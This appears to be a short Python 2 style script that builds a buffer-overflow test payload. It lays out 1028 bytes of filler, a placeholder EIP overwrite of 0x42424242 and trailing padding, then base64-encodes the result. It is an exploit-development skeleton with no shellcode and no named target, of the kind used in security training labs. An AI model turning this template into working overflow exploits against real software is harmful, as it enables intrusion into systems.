import base64, struct

head = "A" * 1028
eip = struct.pack("<I", 0x42424242)
junk = "C" * (5000 - 1028 - 4)

payload = head + eip + junk

print (base64.b64encode(payload))
